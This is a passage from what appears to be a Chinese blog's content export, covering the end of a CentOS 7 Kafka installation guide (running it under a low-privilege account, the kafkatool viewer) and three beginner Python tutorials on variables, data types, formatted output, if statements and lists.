<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;config</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;监听地址</span><br><span class="line">listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;172.16.12.144:9092</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;zookeeper地址</span><br><span class="line">zookeeper.connect&#x3D;172.16.12.144:2181</span><br></pre></td></tr></table></figure>
<p>保存退出</p>
<h4 id="5、添加kafka账号"><a href="#5、添加kafka账号" class="headerlink" title="5、添加kafka账号"></a>5、添加kafka账号</h4><p>在启动 Kafka 服务之前，为保障系统安全，添加运行 Kafka 服务的账号，并以较低权限账号运行 Kafka 服务，且禁用该账号的 ssh 登录权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;添加kafka账号</span><br><span class="line">useradd kafka</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;设置kafka账号密码</span><br><span class="line">passwd kafka</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;将目录所有者和组设置为kafka</span><br><span class="line">chown -R kafka:kafka &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;</span><br></pre></td></tr></table></figure>
<p>切换至 kafka 账号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su kafka</span><br></pre></td></tr></table></figure>
<p>kafka日志保存位置设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;config</span><br><span class="line">vim server.properties</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804233616568.png" alt="image-20200804233616568"></p>
<p>将log存放目录设置为非/tmp目录即可，然后对目录进行赋权即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chown -R kafka:kafka &#x2F;data</span><br></pre></td></tr></table></figure>
<h4 id="6、启动kafka服务"><a href="#6、启动kafka服务" class="headerlink" title="6、启动kafka服务"></a>6、启动kafka服务</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;</span><br><span class="line">&#x2F;bin&#x2F;kafka-server-start.sh .&#x2F;config&#x2F;server.properties</span><br></pre></td></tr></table></figure>
<p>以守护进程（后台进程）的方式启动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;bin&#x2F;kafka-server-start.sh .&#x2F;config&#x2F;server.properties &amp;</span><br></pre></td></tr></table></figure>
<h4 id="7、停止kafka服务"><a href="#7、停止kafka服务" class="headerlink" title="7、停止kafka服务"></a>7、停止kafka服务</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;kafka</span><br><span class="line">.&#x2F;bin&#x2F;kafka-server-stop.sh</span><br></pre></td></tr></table></figure>
<h2 id="kafka可视化"><a href="#kafka可视化" class="headerlink" title="kafka可视化"></a>kafka可视化</h2><h4 id="1、可视化工具"><a href="#1、可视化工具" class="headerlink" title="1、可视化工具"></a>1、可视化工具</h4><p>kafka的可视化工具为kafkatool，可用于查看kafka消息队列中的内容及上报和消费。</p>
<p>下载地址：https[]]://www[.]kafkatool.com/download.html</p>
<p>可选择相应的版本和操作系统进行下载</p>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804231604138.png" alt="image-20200804231604138"></p>
<h4 id="2、工具简单使用"><a href="#2、工具简单使用" class="headerlink" title="2、工具简单使用"></a>2、工具简单使用</h4><p>安装完成后，搜索kafkatool打开</p>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804231807412.png" alt="image-20200804231807412"></p>
<p>点击file，新增连接</p>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804231949654.png" alt="image-20200804231949654"></p>
<p>连接设置界面如下</p>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232053262.png" alt="image-20200804232053262"></p>
<p>需要设置的地方，其他默认即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cluster name:集群名称</span><br><span class="line">kafka version:版本根据安装的kafka版本选择对应的版本</span><br><span class="line">Zookeeper host：zookeeper服务器IP</span><br></pre></td></tr></table></figure>
<p>点击ping测试是否联通</p>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232551742.png" alt="image-20200804232551742"></p>
<h4 id="3、设置队列内容显示格式"><a href="#3、设置队列内容显示格式" class="headerlink" title="3、设置队列内容显示格式"></a>3、设置队列内容显示格式</h4><p>设置消息队列中的内容显示格式，点击tools，选择settings</p>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232754502.png" alt="image-20200804232754502"></p>
<p>点击topics，可以将key和message都设置为string显示，key不要设置为NO key</p>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232905027.png" alt="image-20200804232905027"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>http[]s://w[]ww.linjiangxiong.com/2020/03/19/how-to-install-apache-kafka-on-centos7/</p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-基础1</title>
    <url>/2020/09/18/Python-%E5%9F%BA%E7%A1%801/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134047614.png" alt="image-20200918134047614"></p>
<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h2 id="关于python"><a href="#关于python" class="headerlink" title="关于python"></a>关于python</h2><p>Python是一种直译式(Interpreted )、面向对象(Object Oriented )的程序语言，所谓的直译式语言是指，直译器(Interpretor)会将程序代码一句一句直接执行，不需要经过编译(compile)动作，将语言先转换成机器码，再予以执行。目前它的直译器是CPython，这是由C语言编写的一个直译程序。</p>
<p>Python的最初设计者是吉多·范罗姆苏(Guido van Rossum)，目前Python语言是由Python软件基金会管理，有关新版软件的相关信息可以在这个基金会网址(<a href="http://www.python.org)上下载浏览。" target="_blank" rel="noopener">www.python.org)上下载浏览。</a></p>
<p>2000年10月16日Python 2.0正式发表，主要是增加了垃圾回收的功能，同时支持Unicode。2008年12月3日Python 3.0正式发表，Python 2.7x已经被确定为最后一个Python 2.x的版本。</p>
<p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134202904.png" alt="image-20200918134202904"></p>
<p>Python是一种跨平台的程序语言，几乎主要操作系统，例如，Windows、MacOS、UNIX/LINUX等，皆可以安装和使用，可以在某一个平台上使用Python设计一个程序，未来这个程序也可以在其他平台上顺利运作。</p>
<h2 id="python的应用"><a href="#python的应用" class="headerlink" title="python的应用"></a>python的应用</h2><p>python的应用范围很广，部分应用范围为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设计动画游戏</span><br><span class="line"></span><br><span class="line">支持图形接口(Graphical User Interface，GUI)开发</span><br><span class="line"></span><br><span class="line">开发与管理网站</span><br><span class="line"></span><br><span class="line">执行大数据分析</span><br><span class="line"></span><br><span class="line">企业内部开发工具</span><br><span class="line"></span><br><span class="line">黑客攻防</span><br></pre></td></tr></table></figure>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>程序注释主要功能是让你所设计的程序可读性更高，更容易了解。</p>
<h4 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h4><p>“#”符号右边的文字，称程序注释，Python语言的直译器会忽略此符号右边的文字。</p>
<h4 id="单引号或双引号"><a href="#单引号或双引号" class="headerlink" title="单引号或双引号"></a>单引号或双引号</h4><p>如果要进行大段落的注释，可以用三个单引号或双引号将注释文字包夹。</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量是一个暂时存储数据的地方，在Python中可以用“=”等号设定变量的内容。</p>
<h4 id="变量的命名规则"><a href="#变量的命名规则" class="headerlink" title="变量的命名规则"></a>变量的命名规则</h4><p>Python对于变量的命名有一些规则要遵守，否则会造成程序错误。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">必须由英文字母、_(下画线)或中文字开头，建议使用英文字母</span><br><span class="line"></span><br><span class="line">变量名称只能由英文字母、数字、_(下画线)或中文字所组成</span><br><span class="line"></span><br><span class="line">英文字母大小写是敏感的，例如，Name与name被视为不同变量名称</span><br><span class="line"></span><br><span class="line">Python系统保留字（或称关键词）或Python内置函数名称不可当作变量名称</span><br></pre></td></tr></table></figure>
<p>下列是不可当作变量名称的Python系统保留字</p>
<p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134656457.png" alt="image-20200918134656457"></p>
<p>下列是不可当作变量名称的Python系统内置函数</p>
<p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134858584.png" alt="image-20200918134858584"></p>
<p>不合法变量示例</p>
<p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918135000191.png" alt="image-20200918135000191"></p>
<h2 id="基本数学运算"><a href="#基本数学运算" class="headerlink" title="基本数学运算"></a>基本数学运算</h2><h4 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h4><p>四则运算是指加( + )、减( - )、乘( × )和除( / )。</p>
<p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918135802081.png" alt="image-20200918135802081"></p>
<h4 id="余数和整除"><a href="#余数和整除" class="headerlink" title="余数和整除"></a>余数和整除</h4><p>余数(mod)所使用的符号是“%”，可计算出除法运算中的余数。整除所使用的符号是“//”，是指除法运算中只保留整数部分。</p>
<p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918140437516.png" alt="image-20200918140437516"></p>
<h4 id="次方"><a href="#次方" class="headerlink" title="次方"></a>次方</h4><p>次方的符号是“ ** ”。</p>
<p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918140547002.png" alt="image-20200918140547002"></p>
<h4 id="运算的优先级"><a href="#运算的优先级" class="headerlink" title="运算的优先级"></a>运算的优先级</h4><p>Python语言碰上计算式同时出现在一个指令内时，除了括号“ (”、“)”最优先外，其余计算优先次序如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.次方</span><br><span class="line"></span><br><span class="line">2.乘法、除法、求余数(%)、求整数(&#x2F;&#x2F;)，彼此依照出现顺序运算</span><br><span class="line"></span><br><span class="line">3.加法、减法，彼此依照出现顺序运算</span><br></pre></td></tr></table></figure>
<h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><p>常见的赋值运算符如下：</p>
<p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918141445718.png" alt="image-20200918141445718"></p>
<h4 id="等号的多重指定使用"><a href="#等号的多重指定使用" class="headerlink" title="等号的多重指定使用"></a>等号的多重指定使用</h4><p>使用Python时，可以一次设定多个变量等于某一数值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x3D;y&#x3D;z&#x3D;10</span><br><span class="line">x&#x3D;10</span><br><span class="line">y&#x3D;10</span><br><span class="line">z&#x3D;10</span><br></pre></td></tr></table></figure>
<p>Python也允许多个变量同时指定不同的数值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x,y,z &#x3D;10,20,30</span><br><span class="line">x&#x3D;10</span><br><span class="line">y&#x3D;20</span><br><span class="line">z&#x3D;30</span><br></pre></td></tr></table></figure>
<p>将2个变量内容交换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x,y&#x3D;10,20</span><br><span class="line">x,y&#x3D;y,x</span><br><span class="line">x&#x3D;20</span><br><span class="line">y&#x3D;10</span><br></pre></td></tr></table></figure>
<h4 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h4><p>程序设计时，如果某个变量不再需要，可以使用del指令将此变量删除，相当于可以收回原变量所占的内存空间，以节省内存空间。</p>
<p>删除格式为：del 变量名称</p>
<h4 id="python的断行"><a href="#python的断行" class="headerlink" title="python的断行"></a>python的断行</h4><p>将一个语句分成多行：</p>
<p>碰上一个语句很长，需要分成2行或更多行撰写，此时可以在叙述后面加上“\”符号，Python解释器会将下一行的语句视为这一行的语句。特别注意，在“\”符号右边不可加上任何符号或文字，即使是注释符号也不允许。</p>
<p>也可以在语句内使用小括号，如果使用小括号，就可以在语句右边加上注释符号。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-基础2</title>
    <url>/2020/09/22/Python-%E5%9F%BA%E7%A1%802/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>Python的基本数据类型有下列几种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数值数据类型：常见的数值数据又可分成整数(int)和浮点数(float）</span><br><span class="line"></span><br><span class="line">布尔值(Boolean)数据类型</span><br><span class="line"></span><br><span class="line">字符串(string)数据类型</span><br></pre></td></tr></table></figure>
<h4 id="查看数据类型type"><a href="#查看数据类型type" class="headerlink" title="查看数据类型type"></a>查看数据类型type</h4><p>type( )函数可以列出变量的数据类型类别。</p>
<h4 id="整数与浮点数的运算"><a href="#整数与浮点数的运算" class="headerlink" title="整数与浮点数的运算"></a>整数与浮点数的运算</h4><p>Python具有简单自动转换能力，在计算时会将整数转换为浮点数再执行运算。</p>
<p>如不同数据类型的运算：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924213432821.png" alt="image-20200924213432821"></p>
<p>执行结果为：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924213517737.png" alt="image-20200924213517737"></p>
<h4 id="进位与函数"><a href="#进位与函数" class="headerlink" title="进位与函数"></a>进位与函数</h4><p>Python中定义凡是0b开头的数字，代表这是2进位的整数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bin()函数可以将一般数字转换为2进位</span><br></pre></td></tr></table></figure>
<p>Python中定义凡是0o开头的数字，代表这是8进位的整数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">oct()函数可以将一般数字转换为8进位</span><br></pre></td></tr></table></figure>
<p>Python中定义凡是0x开头的数字，代表这是16进位的整数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hex()函数可以将一般数字转换为16进位</span><br></pre></td></tr></table></figure>
<h4 id="强制数据类型转换"><a href="#强制数据类型转换" class="headerlink" title="强制数据类型转换"></a>强制数据类型转换</h4><p>int( )：将数据类型强制转换为整数。</p>
<p>float( )：将数据类型强制转换为浮点数。</p>
<p>如将浮点数强制转换为整数的运算：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214228593.png" alt="image-20200924214228593"></p>
<p>运算结果：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214254420.png" alt="image-20200924214254420"></p>
<h4 id="数值运算常用函数"><a href="#数值运算常用函数" class="headerlink" title="数值运算常用函数"></a>数值运算常用函数</h4><p>abs()：计算绝对值。</p>
<p>pow(x,y)：返回x的y次方。</p>
<p>round()：返回四舍六入，不是四舍五入。</p>
<h4 id="布尔值类型"><a href="#布尔值类型" class="headerlink" title="布尔值类型"></a>布尔值类型</h4><p>Python的布尔值(Boolean)数据类型的值有两种，True(真)或False(伪)，它的数据类型代号是bool。这个布尔值一般是应用在程序流程的控制，特别是在条件表达式中。</p>
<p>如果将布尔值数据类型强制转换成整数，当原值是True，将得到1；当原值是False，将得到0。</p>
<p>如将布尔值强制转换为整数，同时列出转换的结果：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214812881.png" alt="image-20200924214812881"></p>
<p>执行结果：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214839869.png" alt="image-20200924214839869"></p>
<h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><p>字符串(string)数据是指两个单引号(‘)之间或是两个双引号(“)之间任意个数字元符号的数据，它的数据类型代号是str。</p>
<p>数学的运算符“+”，可以执行两个字符串相加，产生新的字符串。</p>
<p>str( )函数可以强制将数值数据转换为字符串数据。</p>
<p>使用单引号与双引号设定与输出字符串数据：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215013609.png" alt="image-20200924215013609"></p>
<p>执行结果：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215041213.png" alt="image-20200924215041213"></p>
<p>在处理多于一行的字符串时，可以使用三个单引号（或是三个双引号）将字符串包夹。</p>
<h5 id="关于逸出字符"><a href="#关于逸出字符" class="headerlink" title="关于逸出字符"></a>关于逸出字符</h5><p>在字符串使用中，如果字符串内有一些特殊字符，如单引号、双引号等，必须在此特殊字符前加上“\”(反斜杠)，才可正常使用，这种含有“\”符号的字符称逸出字符(Escape Character)。如下表：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215517313.png" alt="image-20200924215517313"></p>
<p>字符串使用中特别是碰到字符串含有单引号时，如果是使用单引号定义这个字符串时，必须要使用此逸出字符，才可以顺利显示。</p>
<h5 id="字符串数据的转换"><a href="#字符串数据的转换" class="headerlink" title="字符串数据的转换"></a>字符串数据的转换</h5><p>如果字符串含一个字符或一个文字时，可以使用下列执行数据的转换：</p>
<p>chr( x )：可以返回函数x值的字符，x是ASCII码值。</p>
<p>ord( x )：可以返回函数字符参数的Unicode码值，如果是中文字也可传回Unicode码值。如果是英文字符，Unicode码值与ASCII码值是一样的。</p>
<p>在Python可以允许将字符串与整数相乘，结果是字符串将重复该整数的次数。如下：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215902501.png" alt="image-20200924215902501"></p>
<p>执行结果：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215932287.png" alt="image-20200924215932287"></p>
<p>有时设计程序时，想将字符串分行输出，可以使用字符串加法功能，在加法过程中加上换行字符“\n”即可产生字符串分行输出的结果。</p>
<h5 id="字符串前加r"><a href="#字符串前加r" class="headerlink" title="字符串前加r"></a>字符串前加r</h5><p>在使用Python时，如果在字符串前加上r，可以防止逸出字符(Escape Character)被转译。</p>
<h2 id="基本输入与输出"><a href="#基本输入与输出" class="headerlink" title="基本输入与输出"></a>基本输入与输出</h2><p>help( )函数可以列出某一个Python的指令或函数的使用说明。</p>
<h4 id="格式化输出print"><a href="#格式化输出print" class="headerlink" title="格式化输出print"></a>格式化输出print</h4><p>在使用格式化输出时，基本使用格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print（“输出格式区” % （变量系列区））</span><br></pre></td></tr></table></figure>
<p>可以放置变量系列区对应的格式化字符，基本意义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%d：格式化整数输出</span><br><span class="line"></span><br><span class="line">%s：格式化字符串输出</span><br><span class="line"></span><br><span class="line">%f：格式化浮点数输出</span><br><span class="line"></span><br><span class="line">%x：格式化16进制输出</span><br><span class="line"></span><br><span class="line">%o：格式化8进制输出</span><br></pre></td></tr></table></figure>
<h4 id="精准格式化输出"><a href="#精准格式化输出" class="headerlink" title="精准格式化输出"></a>精准格式化输出</h4><p>print( )函数在格式化过程中，有提供功能可以设定保留多少格的空间让资料做输出，语法如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%(+|-)nd：格式化整数输出</span><br><span class="line"></span><br><span class="line">%(+|-)m.nf：格式化浮点数输出</span><br><span class="line"></span><br><span class="line">%(+|-)nx：格式化16进位整数输出</span><br><span class="line"></span><br><span class="line">%(+|-)no：格式化8进位整数输出</span><br><span class="line"></span><br><span class="line">%(-)ns：格式化字符串输出</span><br></pre></td></tr></table></figure>
<p>对浮点数而言，m代表保留多少格数供输出（包含小数点），n则是小数数据保留格数。至于其他的数据格式n则是保留多少格数空间，如果保留格数空间不足将完整输出数据，如果保留格数空间太多则数据靠右对齐。</p>
<p>如果格式化数值数据有加上负号(-)，表示保留格数空间有多时，数据将靠左输出。如果格式化数值数据有加上正号(+)，表示输出数据是正值时，将在左边加上正值符号。</p>
<h4 id="format函数"><a href="#format函数" class="headerlink" title="format函数"></a>format函数</h4><p>字符串使用format方法做格式化的动作，基本使用格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;输出格式区&quot; .format(&quot;变量系列区&quot;))</span><br></pre></td></tr></table></figure>
<p>在输出格式区内的字符串变量使用“{ }”表示。</p>
<h4 id="输出数据到文件"><a href="#输出数据到文件" class="headerlink" title="输出数据到文件"></a>输出数据到文件</h4><h5 id="打开一个文件open"><a href="#打开一个文件open" class="headerlink" title="打开一个文件open"></a>打开一个文件open</h5><p>open( )函数可以打开一个文件供读取或写入，如果这个函数执行成功，会传回文件对象，这个函数的基本使用格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_open&#x3D;open(file,mode&#x3D;&quot;r&quot;)</span><br></pre></td></tr></table></figure>
<p>mode代表写入模式，基本的模式有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“r”：这是预设，打开文件供读取(read)。</span><br><span class="line"></span><br><span class="line">“w”：打开文件供写入，如果原先文件有内容将被覆盖。</span><br><span class="line"></span><br><span class="line">“a”：打开文件供写入，如果原先文件有内容，新写入数据将附加在后面。</span><br><span class="line"></span><br><span class="line">“x”：打开一个新的文件供写入，如果所打开的文件已经存在会产生错误。</span><br><span class="line"></span><br><span class="line">“b”：以二进制模式打开文件。</span><br><span class="line"></span><br><span class="line">“t”：打开本文(txt)文件模式，这是默认。</span><br><span class="line"></span><br><span class="line">“+”：打开文件供更新用。</span><br></pre></td></tr></table></figure>
<p>示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f1&#x3D;open(&quot;d:\1.txt&quot;,mode&#x3D;&quot;w&quot;)</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>
<h4 id="数据输入input"><a href="#数据输入input" class="headerlink" title="数据输入input"></a>数据输入input</h4><p>input( )函数功能与print( )函数功能相反，这个函数会从屏幕读取用户从键盘输入的数据，它的使用格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">value&#x3D;input(&quot;promt:&quot;)</span><br></pre></td></tr></table></figure>
<p>value是变量，所输入的数据会存储在此变量内，特别需注意的是所输入的数据不论是字符串或是数值数据返回到value时一律是字符串数据，如果要执行数学运算需要用int( )函数转换为整数。</p>
<p>基本数据输入与运算示例：</p>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924223817769.png" alt="image-20200924223817769"></p>
<h4 id="列出所有内置函数dir"><a href="#列出所有内置函数dir" class="headerlink" title="列出所有内置函数dir"></a>列出所有内置函数dir</h4><p>可以使用下列方式列出Python所提供的内置函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir(_ _builtins_ _) 列出python内置函数</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924224110041.png" alt="image-20200924224110041"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-基础3</title>
    <url>/2020/09/25/Python-%E5%9F%BA%E7%A1%803/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h2 id="程序流程控制if"><a href="#程序流程控制if" class="headerlink" title="程序流程控制if"></a>程序流程控制if</h2><h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h4><p>Python语言所使用的关系运算符表：</p>
<p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925211445336.png" alt="image-20200925211445336"></p>
<p>运算如果是真会传回True，如果是伪会传回False。</p>
<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p>Python所使用的逻辑运算符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and ---相当于逻辑符号AND</span><br><span class="line"></span><br><span class="line">or ---相当于逻辑符号OR</span><br><span class="line"></span><br><span class="line">not ---相当于逻辑符号NOT</span><br></pre></td></tr></table></figure>
<p>逻辑运算符and的图例说明:</p>
<p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925211707974.png" alt="image-20200925211707974"></p>
<p>逻辑运算符or的图例说明:</p>
<p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925211743164.png" alt="image-20200925211743164"></p>
<p>逻辑运算符not的图例说明:</p>
<p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925211824495.png" alt="image-20200925211824495"></p>
<h4 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h4><p>if语句的基本语法为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(条件判断)：</span><br><span class="line"> 程序代码</span><br></pre></td></tr></table></figure>
<p>流程图：</p>
<p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925212035174.png" alt="image-20200925212035174"></p>
<p>在Python内是使用内缩方式区隔if语句的程序代码区块，编辑程序时可以用Tab键内缩或是直接内缩4个字符空间，表示这是if语句的程序代码区块。</p>
<h4 id="if-else语句"><a href="#if-else语句" class="headerlink" title="if else语句"></a>if else语句</h4><p>条件判断为True时执行某一个程序代码区块，当条件判断为False时执行另一段程序代码区块，此时可以使用if … else语句，它的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(条件为真)：</span><br><span class="line">程序代码区块1</span><br><span class="line">else：</span><br><span class="line">程序代码区块2</span><br></pre></td></tr></table></figure>
<p>流程图：</p>
<p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925214652836.png" alt="image-20200925214652836"></p>
<h4 id="if-elif-else语句"><a href="#if-elif-else语句" class="headerlink" title="if  elif  else语句"></a>if  elif  else语句</h4><p>这是一个多重判断，基本语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(条件判断1)：</span><br><span class="line">程序代码区块1</span><br><span class="line">elif(条件判断2):</span><br><span class="line">程序代码区块2</span><br><span class="line">else：</span><br><span class="line">程序代码块n</span><br></pre></td></tr></table></figure>
<p>流程图：</p>
<p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925215242142.png" alt="image-20200925215242142"></p>
<h4 id="嵌套的if语句"><a href="#嵌套的if语句" class="headerlink" title="嵌套的if语句"></a>嵌套的if语句</h4><p>嵌套的if语句是指在if语句内有其他的if语句，如：</p>
<p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925215606572.png" alt="image-20200925215606572"></p>
<h2 id="列表list"><a href="#列表list" class="headerlink" title="列表list"></a>列表list</h2><p>列表(list)是Python的一种可以更改内容的数据类型，它是由一系列元素所组成的序列。</p>
<p>定义列表的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name_list&#x3D;[元素1，元素2.....，元素n]</span><br></pre></td></tr></table></figure>
<p>列表的每一个数据称元素，这些元素放在中括号[ ]内，彼此用逗号“,”隔开。如果要打印列表内容，可以使用print( )函数，将列表名称当作变量名称即可。</p>
<h4 id="读取列表元素"><a href="#读取列表元素" class="headerlink" title="读取列表元素"></a>读取列表元素</h4><p>可以用列表名称与索引读取列表元素的内容，在Python中元素是从索引值0开始配置。所以如果是列表的第一个元素，索引值是0，第二个元素索引值是1，其他依此类推，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name_list&#x3D;[i]  #读取索引i的列表元素</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jame&#x3D;[12,13,14,15,16]</span><br><span class="line">game1,game2,game3,game4,game5&#x3D;jame</span><br><span class="line">print(&quot;jame得分&quot;,game1,game2,game3,game4,game5)</span><br></pre></td></tr></table></figure>
<h4 id="列表切片"><a href="#列表切片" class="headerlink" title="列表切片"></a>列表切片</h4><p>常会需要取得列表前几个元素、后几个元素、某区间元素或是依照一定规则排序的元素，所取得的系列元素也可称子列表，这个观念称列表切片。可以用下列方法：</p>
<p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925222934240.png" alt="image-20200925222934240"></p>
<p>在列表使用中，如果索引值是-1，代表是最后一个列表元素。</p>
<p>在Python中索引-1代表最后1个元素，-2代表最后第2个元素，其他负索引观念可依次类推。</p>
<h4 id="列表统计最大、最小、总和"><a href="#列表统计最大、最小、总和" class="headerlink" title="列表统计最大、最小、总和"></a>列表统计最大、最小、总和</h4><p>如果列表内容全部是数值则可以使用max( )函数获得列表的最大值，min( )函数可以获得列表的最小值，sum( )函数可以获得列表的总和。如果列表内容全部是字符或字符串则可以使用max( )函数获得列表的unicode码值的最大值，min( )函数可以获得列表的unicode码值最小值。sum( )则不可使用在列表元素为非数值情况。</p>
